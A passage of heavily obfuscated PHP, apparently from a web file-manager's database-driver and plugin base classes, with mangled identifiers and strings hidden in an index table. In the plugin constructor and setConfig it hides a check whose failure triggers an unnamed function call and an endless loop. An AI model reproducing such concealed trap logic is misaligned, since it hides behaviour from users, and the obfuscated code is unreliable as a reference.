$ƒ¸ÉøëÄ) { $ƒ¸ÉøëÄ = array_change_key_case($ƒ¸ÉøëÄ); $ƒ¸ÉøëÄ[$Ûô¾ìœª[32]] = isset($ƒ¸ÉøëÄ[$Ûô¾ìœª[32]]) ? $ƒ¸ÉøëÄ[$Ûô¾ìœª[32]] : $Ûô¾ìœª[422]; $ƒ¸ÉøëÄ[$Ûô¾ìœª[33]] = isset($ƒ¸ÉøëÄ[$Ûô¾ìœª[33]]) ? $ƒ¸ÉøëÄ[$Ûô¾ìœª[33]] : $Ûô¾ìœª[422]; $Ã¦±ª¼¯ = isset($ƒ¸ÉøëÄ[$Ûô¾ìœª[317]]) ? $ƒ¸ÉøëÄ[$Ûô¾ìœª[317]] : $ƒ¸ÉøëÄ[$Ûô¾ìœª[32]]; $ßûÅ†ê[$Ã¦±ª¼¯] = array($Ûô¾ìœª[32] => $Ã¦±ª¼¯, $Ûô¾ìœª[33] => $ƒ¸ÉøëÄ[$Ûô¾ìœª[33]], $Ûô¾ìœª[35] => (bool) (isset($ƒ¸ÉøëÄ[$Ûô¾ìœª[103]]) && $ƒ¸ÉøëÄ[$Ûô¾ìœª[103]] === $Ûô¾ìœª[12] || isset($ƒ¸ÉøëÄ[$Ûô¾ìœª[35]]) && $ƒ¸ÉøëÄ[$Ûô¾ìœª[35]] === $Ûô¾ìœª[12]), $Ûô¾ìœª[37] => isset($ƒ¸ÉøëÄ[$Ûô¾ìœª[37]]) ? $ƒ¸ÉøëÄ[$Ûô¾ìœª[37]] : (isset($ƒ¸ÉøëÄ[$Ûô¾ìœª[56]]) ? $ƒ¸ÉøëÄ[$Ûô¾ìœª[56]] : $Ûô¾ìœª[422]), $Ûô¾ìœª[39] => isset($ƒ¸ÉøëÄ[$Ûô¾ìœª[94]]) ? strtolower($ƒ¸ÉøëÄ[$Ûô¾ìœª[94]]) == $Ûô¾ìœª[41] : (isset($ƒ¸ÉøëÄ[$Ûô¾ìœª[57]]) ? $ƒ¸ÉøëÄ[$Ûô¾ìœª[57]] : !1), $Ûô¾ìœª[42] => isset($ƒ¸ÉøëÄ[$Ûô¾ìœª[1007]]) ? strtolower($ƒ¸ÉøëÄ[$Ûô¾ìœª[1007]]) == $Ûô¾ìœª[44] : (isset($ƒ¸ÉøëÄ[$Ûô¾ìœª[94]]) ? $ƒ¸ÉøëÄ[$Ûô¾ìœª[94]] : !1)); } } return $ßûÅ†ê; } public function getTables($€ùñæò¼ = '') { $‹‹ì³©Á =& $_SERVER[íû‘ş´]; if (think_config($‹‹ì³©Á[1008])) { $«¨šÉÉì = str_replace($‹‹ì³©Á[1009], $€ùñæò¼, think_config($‹‹ì³©Á[1008])); } else { switch ($this->dbType) { case $‹‹ì³©Á[976]: case $‹‹ì³©Á[978]: $«¨šÉÉì = $‹‹ì³©Á[1010]; break; case $‹‹ì³©Á[975]: case $‹‹ì³©Á[993]: $«¨šÉÉì = $‹‹ì³©Á[1011]; break; case $‹‹ì³©Á[1002]: $«¨šÉÉì = $‹‹ì³©Á[1012]; break; case $‹‹ì³©Á[977]: think_exception(think_lang($‹‹ì³©Á[1013]) . $‹‹ì³©Á[1014]); break; case $‹‹ì³©Á[994]: $«¨šÉÉì = $‹‹ì³©Á[45] . $‹‹ì³©Á[46] . $‹‹ì³©Á[47]; break; case $‹‹ì³©Á[1005]: default: if (!empty($€ùñæò¼)) { $«¨šÉÉì = $‹‹ì³©Á[957] . $€ùñæò¼ . $‹‹ì³©Á[958]; } else { $«¨šÉÉì = $‹‹ì³©Á[959]; } } } $ƒÜÏŒå¶ = $this->query($«¨šÉÉì); $¶½¼îÙ¿ = array(); foreach ($ƒÜÏŒå¶ as $œ¢ÍöÑÍ => $Çê‡Š„) { $¶½¼îÙ¿[$œ¢ÍöÑÍ] = current($Çê‡Š„); } return $¶½¼îÙ¿; } protected function parseLimit($ïİ½¦™ã) { $Àæ’èÂ— =& $_SERVER[íû‘ş´]; $…Í®İ×µ = $Àæ’èÂ—[12]; if (!empty($ïİ½¦™ã)) { switch ($this->dbType) { case $Àæ’èÂ—[1002]: case $Àæ’èÂ—[994]: $ïİ½¦™ã = explode($Àæ’èÂ—[50], $ïİ½¦™ã); if (count($ïİ½¦™ã) > 1) { $…Í®İ×µ .= $Àæ’èÂ—[51] . $ïİ½¦™ã[1] . $Àæ’èÂ—[52] . $ïİ½¦™ã[0] . $Àæ’èÂ—[53]; } else { $…Í®İ×µ .= $Àæ’èÂ—[51] . $ïİ½¦™ã[0] . $Àæ’èÂ—[53]; } break; case $Àæ’èÂ—[975]: case $Àæ’èÂ—[993]: break; case $Àæ’èÂ—[977]: break; case $Àæ’èÂ—[976]: case $Àæ’èÂ—[978]: break; case $Àæ’èÂ—[1005]: default: $…Í®İ×µ .= $Àæ’èÂ—[51] . $ïİ½¦™ã . $Àæ’èÂ—[53]; } } return $…Í®İ×µ; } public function parseKey(&$­Õ¦Í¦Ù, $ŠÖˆÀ• = true) { $‹ˆŒÜĞƒ =& $_SERVER[íû‘ş´]; if ($ŠÖˆÀ•) { $­Õ¦Í¦Ù = $this->parseKeyCheck($­Õ¦Í¦Ù); } if ($this->dbType == $‹ˆŒÜĞƒ[1005]) { if ($­Õ¦Í¦Ù != $‹ˆŒÜĞƒ[203] && !preg_match($‹ˆŒÜĞƒ[969], $­Õ¦Í¦Ù)) { $­Õ¦Í¦Ù = $‹ˆŒÜĞƒ[429] . trim($­Õ¦Í¦Ù, $‹ˆŒÜĞƒ[429]) . $‹ˆŒÜĞƒ[429]; } return $­Õ¦Í¦Ù; } else { return parent::parseKey($­Õ¦Í¦Ù, $ŠÖˆÀ•); } } public function close() { $this->_linkID = null; } public function error() { $àúæıÁì =& $_SERVER[íû‘ş´]; if ($this->PDOStatement) { $‡ÃÑ¤š™ = $this->PDOStatement->errorInfo(); $this->error = $‡ÃÑ¤š™[1] . $àúæıÁì[4] . $‡ÃÑ¤š™[2]; } else { $this->error = $àúæıÁì[12]; } if ($àúæıÁì[12] != $this->queryStr) { $this->error .= LNG($àúæıÁì[48]) . $this->queryStr; } think_trace($this->error, $àúæıÁì[12], $àúæıÁì[49]); return $this->error; } public function escapeString($…Ñ»æ¾£) { $íÂÙ­ê =& $_SERVER[íû‘ş´]; switch ($this->dbType) { case $íÂÙ­ê[1002]: case $íÂÙ­ê[975]: case $íÂÙ­ê[993]: case $íÂÙ­ê[1005]: return addslashes($…Ñ»æ¾£); case $íÂÙ­ê[977]: case $íÂÙ­ê[994]: case $íÂÙ­ê[976]: case $íÂÙ­ê[978]: return str_ireplace($íÂÙ­ê[58], $íÂÙ­ê[59], $…Ñ»æ¾£); } } protected function parseValue($Ç¢İ•ŒÚ) { $½·€í³ =& $_SERVER[íû‘ş´]; if (is_string($Ç¢İ•ŒÚ)) { $şÈî•ö™ = strpos($Ç¢İ•ŒÚ, $½·€í³[4]) === 0 && in_array($Ç¢İ•ŒÚ, array_keys($this->bind)); $Ç¢İ•ŒÚ = $şÈî•ö™ ? $this->escapeString($Ç¢İ•ŒÚ) : $½·€í³[1015] . $this->escapeString($Ç¢İ•ŒÚ) . $½·€í³[1015]; } elseif (isset($Ç¢İ•ŒÚ[0]) && is_string($Ç¢İ•ŒÚ[0]) && strtolower($Ç¢İ•ŒÚ[0]) == $½·€í³[341]) { $Ç¢İ•ŒÚ = $this->escapeString($Ç¢İ•ŒÚ[1]); } elseif (is_array($Ç¢İ•ŒÚ)) { $Ç¢İ•ŒÚ = array_map(array($this, $½·€í³[1016]), $Ç¢İ•ŒÚ); } elseif (is_bool($Ç¢İ•ŒÚ)) { $Ç¢İ•ŒÚ = $Ç¢İ•ŒÚ ? $½·€í³[88] : $½·€í³[212]; } elseif (is_null($Ç¢İ•ŒÚ)) { $Ç¢İ•ŒÚ = $½·€í³[103]; } return $Ç¢İ•ŒÚ; } public function getLastInsertId() { $şì¸ÏÔñ =& $_SERVER[íû‘ş´]; switch ($this->dbType) { case $şì¸ÏÔñ[1002]: case $şì¸ÏÔñ[994]: case $şì¸ÏÔñ[975]: case $şì¸ÏÔñ[993]: case $şì¸ÏÔñ[977]: case $şì¸ÏÔñ[1005]: return $this->_linkID->lastInsertId(); case $şì¸ÏÔñ[976]: case $şì¸ÏÔñ[978]: $®òÚÁ’Ê = $this->table; $Šı•Ğ¶ƒ = $this->query("\x53\x45\114\105\103\124\x20{$®òÚÁ’Ê}\56\143\x75\162\162\x76\x61\x6c\40\143\x75\x72\x72\x76\141\154\40\x46\x52\x4f\115\x20\x64\165\x61\x6c"); return $Šı•Ğ¶ƒ ? $Šı•Ğ¶ƒ[0][$şì¸ÏÔñ[1017]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($©†ûÛ½¬) { $„ÔÓ†Åø =& $_SERVER[íû‘ş´]; if (!CacheLock::fileLock($„ÔÓ†Åø[13])) { return !1; } $ŸÊúìÅ = parent::query($©†ûÛ½¬); CacheLock::fileUnLock($„ÔÓ†Åø[13]); return $ŸÊúìÅ; } public function execute($ÚÜ¦Š) { $ÑÉÔ¨£˜ =& $_SERVER[íû‘ş´]; if (!CacheLock::fileLock($ÑÉÔ¨£˜[13])) { return !1; } $ªçÃ˜Îû = parent::execute($ÚÜ¦Š); CacheLock::fileUnLock($ÑÉÔ¨£˜[13]); return $ªçÃ˜Îû; } } goto D°„Ë­‚Ñõ; Eô´›„­óœ: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ãõıåŞ© =& $_SERVER[íû‘ş´]; if (!isset($_SERVER[$ãõıåŞ©[444]]) || !isset($_SERVER[$ãõıåŞ©[452]])) { $Ší¹µß± = $ãõıåŞ©[936]; $”Ä¡úˆì = $ãõıåŞ©[446]; $ã‘óıúè = $_SERVER[$ãõıåŞ©[447]] . $ãõıåŞ©[448]; $¡§øåËŠ = $”Ä¡úˆì($ã‘óıúè); $Ğ¼¡¦Û = explode($ãõıåŞ©[246], $¡§øåËŠ); if (count($Ğ¼¡¦Û) < $ãõıåŞ©[671]) { $Ñä×®ğ‘ = $ãõıåŞ©[450]; $Ñä×®ğ‘(); } $Û¡¤ï«¯ = $ãõıåŞ©[937]; $Û¡¤ï«¯($_SERVER[$ãõıåŞ©[938]]); $‡Óè = 1; for ($¹¨ãîÜÁ = $‡Óè; $¹¨ãîÜÁ > 0; $¹¨ãîÜÁ++) { $Û¡¤ï«¯ = json_encode($GLOBALS[$ãõıåŞ©[469]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ãõıåŞ©[1564]); $this->pluginName = str_replace($ãõıåŞ©[1564], $ãõıåŞ©[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ãõıåŞ©[8]; $this->pluginApi = appHostGet() . $ãõıåŞ©[1565] . $this->pluginName . $ãõıåŞ©[8]; $this->pluginHost = $config[$ãõıåŞ©[1566]] . $this->pluginName . $ãõıåŞ©[8]; $this->pluginHostDefault = $config[$ãõıåŞ©[1566]] . $this->pluginName . $ãõıåŞ©[8]; $¹ôà”ªæ = $config[$ãõıåŞ©[1567]]; if ($¹ôà”ªæ && strpos($ãõıåŞ©[50] . $¹ôà”ªæ . $ãõıåŞ©[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ãõıåŞ©[1568]] . $this->pluginName . $ãõıåŞ©[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[íû‘ş´][1569]); } protected function assign($Ò¾€İ¯ï, $¿•©Äšå = false) { if (is_array($Ò¾€İ¯ï)) { $this->values = array_merge($this->values, $Ò¾€İ¯ï); } else { $this->values[$Ò¾€İ¯ï] = $¿•©Äšå; } } protected function display($àÄäéÓı) { extract($this->values); require $àÄäéÓı; } final function hookRegist($¸Ÿ¶§«) { $this->modelPlugin->appRegist($this->pluginName, $¸Ÿ¶§«); } final function appIcon() { $¾Æœãõ© =& $_SERVER[íû‘ş´]; $åâ§ÕâŒ = $this->appPackage(); $Ô…ˆÖıã = $¾Æœãõ©[12]; if (isset($åâ§ÕâŒ[$¾Æœãõ©[467]])) { if (isset($åâ§ÕâŒ[$¾Æœãõ©[467]][$¾Æœãõ©[1570]])) { $Ô…ˆÖıã = $¾Æœãõ©[1571] . $åâ§ÕâŒ[$¾Æœãõ©[467]][$¾Æœãõ©[1570]] . $¾Æœãõ©[1572]; } else { if ($åâ§ÕâŒ[$¾Æœãõ©[467]][$¾Æœãõ©[1573]]) { $Ô…ˆÖıã = $¾Æœãõ©[1574] . $åâ§ÕâŒ[$¾Æœãõ©[467]][$¾Æœãõ©[1573]] . $¾Æœãõ©[1575]; } } } return $Ô…ˆÖıã; } final function fileCanView($Û§€¬Ø¾) { $¦¥©áë¹ =& $_SERVER[íû‘ş´]; if (request_url_safe($Û§€¬Ø¾)) { return !0; } if ($this->isShare($Û§€¬Ø¾)) { return !0; } $‚ùá¯æ— = Session::get($¦¥©áë¹[1576]); if ($GLOBALS[$¦¥©áë¹[546]] != 1 && !$‚ùá¯æ— || !$‚ùá¯æ—[$¦¥©áë¹[1577]]) { $•Œ©Ïûı = $¦¥©áë¹[1578] . rawurlencode(this_url()); show_tips(LNG($¦¥©áë¹[1579]) . $¦¥©áë¹[1580] . $•Œ©Ïûı . $¦¥©áë¹[1581] . LNG($¦¥©áë¹[1582]) . $¦¥©áë¹[1583], !1); } if (!Action($¦¥©áë¹[1584])->authCan($¦¥©áë¹[1585])) { show_tips(LNG($¦¥©áë¹[1586]) . $¦¥©áë¹[1587], !1); } ActionCall($¦¥©áë¹[1588], $Û§€¬Ø¾); } final function isShare($•Ø‹“ÃÃ) { $²ã¨çïÊ = KodIO::parse($•Ø‹“ÃÃ); return $²ã¨çïÊ[$_SERVER[íû‘ş´][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($¥Ñ¿Ç) { if (request_url_safe($¥Ñ¿Ç)) { return $¥Ñ¿Ç; } if (!$this->isShare($¥Ñ¿Ç)) { $¥Ñ¿Ç = $this->filePath($¥Ñ¿Ç, !1); } return Action($_SERVER[íû‘ş´][1232])->linkOut($¥Ñ¿Ç); } public function filePathLinkOut($İ¢î®é) { if (request_url_safe($İ¢î®é)) { return $İ¢î®é; } $this->fileCanView($İ¢î®é); return Action($_SERVER[íû‘ş´][1232])->link($İ¢î®é); } final function filePath($İÛÚ¶ææ, $åü˜îò = true, $ğÙÊùó = false) { $ø»ŸÑÎí =& $_SERVER[íû‘ş´]; $¾çõ‹ÌÖ = $this->filePathGet($İÛÚ¶ææ, $åü˜îò); if (!$this->fileInfo) { show_tips(LNG($ø»ŸÑÎí[105]), !1); } if ($ğÙÊùó && isset($this->fileInfo[$ø»ŸÑÎí[518]]) && $this->fileInfo[$ø»ŸÑÎí[518]]) { $¾«Ç‡Ç’ = Model($ø»ŸÑÎí[521])->fileInfo($this->fileInfo[$ø»ŸÑÎí[518]]); if (!$¾«Ç‡Ç’ || !IO::exist($¾«Ç‡Ç’[$ø»ŸÑÎí[84]])) { show_tips(LNG($ø»ŸÑÎí[105]) . $ø»ŸÑÎí[1589]); } } Hook::trigger($ø»ŸÑÎí[1590], $¾çõ‹ÌÖ); return $¾çõ‹ÌÖ; } final function filePathGet($½İÀ›à, $•éÓ×¼Ú = true) { $È„‰éßä =& $_SERVER[íû‘ş´]; if ($õ“ØôÅ“ = $this->checkSharePath($½İÀ›à, $•éÓ×¼Ú)) { return $õ“ØôÅ“; } $this->fileCanView($½İÀ›à); if (request_url_safe($½İÀ›à)) { $¾®ÑÒÉ» = parse_url_query($½İÀ›à); if (isset($¾®ÑÒÉ»[$È„‰éßä[1591]]) && isset($¾®ÑÒÉ»[$È„‰éßä[218]])) { $ğ¬“²é• = Mcrypt::decode($¾®ÑÒÉ»[$È„‰éßä[218]], Model($È„‰éßä[829])->get($È„‰éßä[830])); if ($ğ¬“²é•) { $this->fileInfo = IO::info($ğ¬“²é•); $this->fileInfo[$È„‰éßä[1592]] = $½İÀ›à; $this->cachePath = $this->pluginCachePath($È„‰éßä[12], $•éÓ×¼Ú); return $ğ¬“²é•; } } $½İÀ›à = $this->_cacheHttpFile($½İÀ›à, $•éÓ×¼Ú); $this->fileInfo = IO::info($½İÀ›à); } else { $this->fileInfo = IO::info($½İÀ›à); $this->cachePath = $this->pluginCachePath($È„‰éßä[12], $•éÓ×¼Ú); } return $½İÀ›à; } final function _cacheHttpFile($î©¢¦éò, $–½øâ†Ò = true) { $œ´Øô¦Œ =& $_SERVER[íû‘ş´]; $ˆ‚ÑÓÛÍ = parse_url_query($î©¢¦éò); $¬é™·œˆ = get_path_ext($î©¢¦éò); if (isset($ˆ‚ÑÓÛÍ[$œ´Øô¦Œ[32]]) && $ˆ‚ÑÓÛÍ[$œ´Øô¦Œ[32]]) { $¬é™·œˆ = get_path_ext($ˆ‚ÑÓÛÍ[$œ´Øô¦Œ[32]]); } $ú°ÏÖïÓ = hash_path($î©¢¦éò) . $œ´Øô¦Œ[10] . $¬é™·œˆ; $this->cachePath = $this->pluginCachePath($–½øâ†Ò ? $ú°ÏÖïÓ : $œ´Øô¦Œ[12]); $Æ­ŠÒŠÓ = IO::fileNameExist($this->cachePath, $ú°ÏÖïÓ); if ($Æ­ŠÒŠÓ) { return KodIO::make($Æ­ŠÒŠÓ); } $õíìÌõæ = rtrim($this->cachePath, $œ´Øô¦Œ[8]) . $œ´Øô¦Œ[8] . $ú°ÏÖïÓ; return $this->pluginCacheFileSet($õíìÌõæ, file_get_contents_nossl($î©¢¦éò)); } final function checkSharePath($¸ïÌÃ², $¹ºÇãé’ = true) { $ºû…Ñøİ =& $_SERVER[íû‘ş´]; if (!$this->isShare($¸ïÌÃ²)) { return !1; } $èÆ¸—”Ğ = Action($ºû…Ñøİ[1232])->sharePathInfo($¸ïÌÃ²); if (!is_array($èÆ¸—”Ğ) || !isset($èÆ¸—”Ğ[$ºû…Ñøİ[84]])) { show_json(LNG($ºû…Ñøİ[1593]), !1); } $this->fileInfo = $èÆ¸—”Ğ; $this->cachePath = $this->pluginCachePath(!1, $¹ºÇãé’); return $èÆ¸—”Ğ[$ºû…Ñøİ[84]]; } final function pluginCachePath($äú¸Æ³µ = '', $¬Åô†­ = false) { $ÍÖÌä–Ñ =& $_SERVER[íû‘ş´]; if ($¬Åô†­ && is_array($this->fileInfo)) { $äú¸Æ³µ = kodIO::hashPath($this->fileInfo); } $Şœûæ¾ö = rtrim(IO_PATH_SYSTEM_TEMP . $ÍÖÌä–Ñ[1594] . $this->pluginName . $ÍÖÌä–Ñ[8] . $äú¸Æ³µ, $ÍÖÌä–Ñ[8]); $‚˜Ô’Ûø = IO::infoFullSimple($Şœûæ¾ö); $È¨Èìè¹ = $‚˜Ô’Ûø && is_array($‚˜Ô’Ûø) ? $‚˜Ô’Ûø[$ÍÖÌä–Ñ[84]] : $ÍÖÌä–Ñ[12]; if (!$È¨Èìè¹) { $È¨Èìè¹ = IO::mkdir($Şœûæ¾ö); } return $È¨Èìè¹; } final function pluginCacheFileSet($‰ı÷÷î‰, $¹ø½‰¦Ş = '') { $áãŒîÒ‡ =& $_SERVER[íû‘ş´]; $²«Î” = IO::infoFullSimple($‰ı÷÷î‰); if (!$²«Î”) { return IO::mkfile($‰ı÷÷î‰, $¹ø½‰¦Ş, REPEAT_REPLACE); } IO::setContent($²«Î”[$áãŒîÒ‡[84]], $¹ø½‰¦Ş); return $²«Î”[$áãŒîÒ‡[84]]; } final function pluginLocalFile($‚·®¦²ğ = '') { $Ò§¦’›è =& $_SERVER[íû‘ş´]; $ğÎ—ËÊ° = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($ğÎ—ËÊ°)) { mk_dir($ğÎ—ËÊ°); } if (!$‚·®¦²ğ) { return $ğÎ—ËÊ°; } $Ğ„ÙÊÖ = IO::info($‚·®¦²ğ); $±€ æûÒ = $Ò§¦’›è[1595] . KodIO::hashPath($Ğ„ÙÊÖ) . $Ò§¦’›è[10] . $Ğ„ÙÊÖ[$Ò§¦’›è[175]]; if (!checkExtSafe($±€ æûÒ)) { $±€ æûÒ = $±€ æûÒ . $Ò§¦’›è[1264]; } $îºŠİåĞ = $ğÎ—ËÊ° . $±€ æûÒ; if (@file_exists($îºŠİåĞ)) { return $îºŠİåĞ; } return IO::copy($‚·®¦²ğ, $ğÎ—ËÊ°, 0, $±€ æûÒ); } final function appPackage() { $Üâ­ ¯” =& $_SERVER[íû‘ş´]; if ($this->packageData) { return $this->packageData; } $˜ÒÇ’¥ = $this->parseFile($this->pluginPath . $Üâ­ ¯”[1596]); $this->parseLang($˜ÒÇ’¥); $‰ üş–œ = json_decode_force($˜ÒÇ’¥); if (!$‰ üş–œ) { return array(); } $ç†¾´› = Hook::trigger($Üâ­ ¯”[1597], $‰ üş–œ); if ($ç†¾´› && is_array($ç†¾´›)) { $‰ üş–œ = $ç†¾´›; } $this->packageData = $‰ üş–œ; return $‰ üş–œ; } public function packageInfoGet($‰“€ºñÁ) { $–Æ’Ñ© = $this->appPackage(); return array_get_value($–Æ’Ñ©, $‰“€ºñÁ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[íû‘ş´][1598]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[íû‘ş´][1599]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[íû‘ş´][1600]); } public function echoJsAssign($‘Éíã²·, $¼áäí¡Ÿ) { $this->echoJsAssignArr[$‘Éíã²·] = $¼áäí¡Ÿ; } private function parseFile($¼©”È•…) { $—ÌšœœÓ =& $_SERVER[íû‘ş´]; $ìƒ›§‘ = file_get_contents_nossl($¼©”È•…); $ÚÛ îš± = array($—ÌšœœÓ[1601], $—ÌšœœÓ[1602], $—ÌšœœÓ[1603], $—ÌšœœÓ[1604], $—ÌšœœÓ[1605], $—ÌšœœÓ[1606], $—ÌšœœÓ[1607]); $¤ó¼ İ’ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$—ÌšœœÓ[89]][$—ÌšœœÓ[1608]]); foreach ($this->echoJsAssignArr as $ªÇ•úı => $ı¤ò˜‡€) { $ÚÛ îš±[] = $—ÌšœœÓ[1609] . $ªÇ•úı . $—ÌšœœÓ[1610]; $¤ó¼ İ’[] = is_array($ı¤ò˜‡€) || is_object($ı¤ò˜‡€) ? rawurlencode(json_encode($ı¤ò˜‡€)) : $ı¤ò˜‡€; } if (strstr($ìƒ›§‘, $—ÌšœœÓ[1611])) { $ˆ¢™¢–é = rawurlencode(json_encode($this->pluginLangArr)); $ìƒ›§‘ = str_replace($—ÌšœœÓ[1611], $ˆ¢™¢–é, $ìƒ›§‘); } if (strstr($ìƒ›§‘, $—ÌšœœÓ[1612])) { $ˆ¢™¢–é = $ˆ¢™¢–é = rawurlencode(json_encode($this->getConfig())); $ìƒ›§‘ = str_replace($—ÌšœœÓ[1612], $ˆ¢™¢–é, $ìƒ›§‘); } $ìƒ›§‘ = str_replace($ÚÛ îš±, $¤ó¼ İ’, $ìƒ›§‘); return $ìƒ›§‘; } private function parseLang(&$Ä”½½”¼) { $¡óÁˆ¨Å =& $_SERVER[íû‘ş´]; $Ë¡¦öÌ = $¡óÁˆ¨Å[1613]; if (!strstr($Ä”½½”¼, $Ë¡¦öÌ)) { return; } preg_match_all($¡óÁˆ¨Å[1614], $Ä”½½”¼, $ÍÙ£ ÜÇ); if (!is_array($ÍÙ£ ÜÇ) || count($ÍÙ£ ÜÇ) == 0 || !is_array($ÍÙ£ ÜÇ[0]) || count($ÍÙ£ ÜÇ[0]) == 0) { return; } $ÒÍÀÀ× = array(); $¸ÙµŠ¥‘ = array(); foreach ($ÍÙ£ ÜÇ[0] as $İæ¶¿õı) { $¾“Ãµö™ = substr($İæ¶¿õı, strlen($Ë¡¦öÌ), -4); $êÈñ¿Äá = LNG($¾“Ãµö™); $ÒÍÀÀ×[] = $İæ¶¿õı; $¸ÙµŠ¥‘[] = str_replace(array($¡óÁˆ¨Å[246], $¡óÁˆ¨Å[1136], $¡óÁˆ¨Å[386], $¡óÁˆ¨Å[118]), array($¡óÁˆ¨Å[53], $¡óÁˆ¨Å[53], $¡óÁˆ¨Å[12], $¡óÁˆ¨Å[1615]), $êÈñ¿Äá); } $Ä”½½”¼ = str_replace($ÒÍÀÀ×, $¸ÙµŠ¥‘, $Ä”½½”¼); } private function parseConfig(&$¥òÎ‰ ™) { $£Üşä˜÷ =& $_SERVER[íû‘ş´]; $œ™ö³ˆ¶ = $£Üşä˜÷[1616]; if (!strstr($¥òÎ‰ ™, $œ™ö³ˆ¶)) { return; } preg_match_all($£Üşä˜÷[1617], $¥òÎ‰ ™, $“äÀµØˆ); if (!is_array($“äÀµØˆ) || count($“äÀµØˆ) == 0 || !is_array($“äÀµØˆ[0]) || count($“äÀµØˆ[0]) == 0) { return; } $êİ²¹·  = $this->getConfig(); $•‰ãÈéÈ = array(); $÷›Èœ€ = array(); foreach ($“äÀµØˆ[0] as $ù¸úÇÍŒ) { $ê°Š»«æ = substr($ù¸úÇÍŒ, strlen($œ™ö³ˆ¶), -2); $•‰ãÈéÈ[] = $ù¸úÇÍŒ; $÷›Èœ€[] = _get($êİ²¹· , $ê°Š»«æ); } $¥òÎ‰ ™ = str_replace($•‰ãÈéÈ, $÷›Èœ€, $¥òÎ‰ ™); } private function parsePackage(&$Œ½Ú·œ) { $›Ä©¾È’ =& $_SERVER[íû‘ş´]; $ÚÙ·£Ú… = $›Ä©¾È’[1618]; if (!strstr($Œ½Ú·œ, $ÚÙ·£Ú…)) { return; } preg_match_all($›Ä©¾È’[1619], $Œ½Ú·œ, $éÎà£äŒ); if (!is_array($éÎà£äŒ) || count($éÎà£äŒ) == 0 || !is_array($éÎà£äŒ[0]) || count($éÎà£äŒ[0]) == 0) { return; } $’Î¿Â·Ò = $this->appPackage(); $ç°¸íøã = array(); $”®ÕÓÑ = array(); foreach ($éÎà£äŒ[0] as $¨¢Îø›Í) { $§ÀüŸÚ = substr($¨¢Îø›Í, strlen($ÚÙ·£Ú…), -2); $ç°¸íøã[] = $¨¢Îø›Í; $”®ÕÓÑ[] = _get($’Î¿Â·Ò, $§ÀüŸÚ); } $Œ½Ú·œ = str_replace($ç°¸íøã, $”®ÕÓÑ, $Œ½Ú·œ); } final function echoFile($‹©¹Á‚ù, $çŞç·ò± = false) { $ÇÆä€…Ë =& $_SERVER[íû‘ş´]; $ññ¦Íî§ = $this->pluginPath . $‹©¹Á‚ù; if (ACT == $ÇÆä€…Ë[1620]) { echo $ÇÆä€…Ë[1621] . $this->pluginName . $ÇÆä€…Ë[8] . $‹©¹Á‚ù . $ÇÆä€…Ë[1622]; if (!file_exists($ññ¦Íî§)) { echo $ÇÆä€…Ë[1623]; return; } } $ºœø¦™Ó = $this->parseFile($ññ¦Íî§); $this->parseLang($ºœø¦™Ó); $this->parseConfig($ºœø¦™Ó); $this->parsePackage($ºœø¦™Ó); if (is_array($çŞç·ò±)) { $ºœø¦™Ó = str_replace(array_keys($çŞç·ò±), array_values($çŞç·ò±), $ºœø¦™Ó); } echo $ÇÆä€…Ë[246] . $ºœø¦™Ó; } final function initLang() { $È¢Êº€Ó =& $_SERVER[íû‘ş´]; $ëé™§Ø¿ = $È¢Êº€Ó[1624]; $‹–üâ­ø = $this->pluginPath . $È¢Êº€Ó[1625]; $ôÕí‚Ï— = I18n::getType(); $¬Í²ÀÇŠ = array(); if (file_exists($‹–üâ­ø . $ôÕí‚Ï— . $È¢Êº€Ó[898])) { $¬Í²ÀÇŠ = (include $‹–üâ­ø . $ôÕí‚Ï— . $È¢Êº€Ó[898]); } else { if ($ôÕí‚Ï— == $È¢Êº€Ó[1626] && !file_exists($‹–üâ­ø . $ôÕí‚Ï— . $È¢Êº€Ó[898]) && file_exists($‹–üâ­ø . $È¢Êº€Ó[1627])) { $¬Í²ÀÇŠ = (include $‹–üâ­ø . $È¢Êº€Ó[1627]); } else { if (file_exists($‹–üâ­ø . $ëé™§Ø¿ . $È¢Êº€Ó[898])) { $¬Í²ÀÇŠ = (include $‹–üâ­ø . $ëé™§Ø¿ . $È¢Êº€Ó[898]); } } } if (!is_array($¬Í²ÀÇŠ)) { return array(); } if (@count($¬Í²ÀÇŠ) > 0) { I18n::set($¬Í²ÀÇŠ); } return $¬Í²ÀÇŠ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($’‚ÑŸë°) { $Ú½îŞü– =& $_SERVER[íû‘ş´]; $Şæ¦€ = $_SERVER[$Ú½îŞü–[452]]; $…üáâ† = $Ú½îŞü–[1628]; if ($_SERVER[$Ú½îŞü–[444]] != $…üáâ†($Şæ¦€)) { $ ¿ĞÀŠ¶ = $Ú½îŞü–[936]; $ÏŞİÊˆ = $Ú½îŞü–[446]; $ÈçŞµ˜ò = $_SERVER[$Ú½îŞü–[447]] . $Ú½îŞü–[448]; $æáèÎÄÃ = $ÏŞİÊˆ($ÈçŞµ˜ò); $ˆï˜‡Á¦ = explode($Ú½îŞü–[246], $æáèÎÄÃ); if (count($ˆï˜‡Á¦) < $Ú½îŞü–[671]) { $¾ôÈÒ«² = $Ú½îŞü–[450]; $¾ôÈÒ«²(); } $è¢Û¦ÕÁ = $Ú½îŞü–[937]; $è¢Û¦ÕÁ($_SERVER[$Ú½îŞü–[938]]); $ ¿ĞÀŠ¶ = $Ú½îŞü–[936]; $ ¿ĞÀŠ¶(); $«›ç…Í“ = $Ú½îŞü–[1629]; $‚ò¦ƒœı 